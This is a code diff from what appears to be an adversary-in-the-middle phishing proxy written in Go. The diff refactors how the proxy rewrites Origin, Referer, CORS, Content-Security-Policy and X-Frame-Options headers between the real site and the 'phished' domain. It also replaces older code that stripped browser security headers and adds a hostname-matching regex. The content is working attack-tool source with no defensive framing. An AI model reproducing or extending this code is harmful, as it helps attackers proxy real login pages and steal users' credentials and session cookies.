@@ -52,6 +52,7 @@ const (
 	// borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
 	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
 	MATCH_URL_REGEXP_WITHOUT_SCHEME = `\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
+	MATCH_HOST_REGEXP               = `\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`
 )
 
 type HttpProxy struct {
@@ -384,26 +385,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// fix origin
-				origin := req.Header.Get("Origin")
-				if origin != "" {
-					if o_url, err := url.Parse(origin); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-							o_url.Host = r_host
-							req.Header.Set("Origin", o_url.String())
-						}
-					}
-				}
+				p.replaceHeaderWithOriginal(req, "Origin")
 
 				// fix referer
-				referer := req.Header.Get("Referer")
-				if referer != "" {
-					if o_url, err := url.Parse(referer); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-							o_url.Host = r_host
-							req.Header.Set("Referer", o_url.String())
-						}
-					}
-				}
+				p.replaceHeaderWithOriginal(req, "Referer")
+
 				req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
@@ -605,28 +591,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
-			if allow_origin != "" && allow_origin != "*" {
-				if u, err := url.Parse(allow_origin); err == nil {
-					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
-						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
-					}
-				} else {
-					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
-				}
-				resp.Header.Set("Access-Control-Allow-Credentials", "true")
-			}
-			var rm_headers = []string{
-				"Content-Security-Policy",
-				"Content-Security-Policy-Report-Only",
-				"Strict-Transport-Security",
-				"X-XSS-Protection",
-				"X-Content-Type-Options",
-				"X-Frame-Options",
-			}
-			for _, hdr := range rm_headers {
-				resp.Header.Del(hdr)
-			}
+			// adapt response headers
+			p.replaceHeaderWithPhished(resp, "Access-Control-Allow-Origin")
+			p.replaceHeaderWithPhished(resp, "Content-Security-Policy")
+			p.replaceHeaderWithPhished(resp, "Content-Security-Policy-Report-Only")
+			p.replaceHeaderWithPhished(resp, "X-Frame-Options")
 
 			redirect_set := false
 			if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1026,6 +995,52 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
 
 	return body
+}
+
+func (p *HttpProxy) replaceHeaderWithOriginal(req *http.Request, header string) {
+	if _, ok := req.Header[header]; ok {
+		// The browser might send the same header more than once
+		Hmap := req.Header.Values(header)
+		for i, H := range Hmap {
+			Hmap[i] = p.replaceStringWithOriginal(H)
+		}
+		req.Header[header] = Hmap
+	}
+}
+
+func (p *HttpProxy) replaceHeaderWithPhished(resp *http.Response, header string) {
+	if _, ok := resp.Header[header]; ok {
+		// The server might send the same header more than once
+		Hmap := resp.Header.Values(header)
+		for i, H := range Hmap {
+			Hmap[i] = p.replaceStringWithPhished(H)
+		}
+		resp.Header[header] = Hmap
+	}
+}
+
+func (p *HttpProxy) replaceStringWithOriginal(str string) string {
+	re_host := regexp.MustCompile(MATCH_HOST_REGEXP)
+
+	str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
+		if o_host, ok := p.replaceHostWithOriginal(s_host); ok {
+			return o_host
+		}
+		return s_host
+	})
+	return str
+}
+
+func (p *HttpProxy) replaceStringWithPhished(str string) string {
+	re_host := regexp.MustCompile(MATCH_HOST_REGEXP)
+
+	str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
+		if o_host, ok := p.replaceHostWithPhished(s_host); ok {
+			return o_host
+		}
+		return s_host
+	})
+	return str
 }
 
 func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
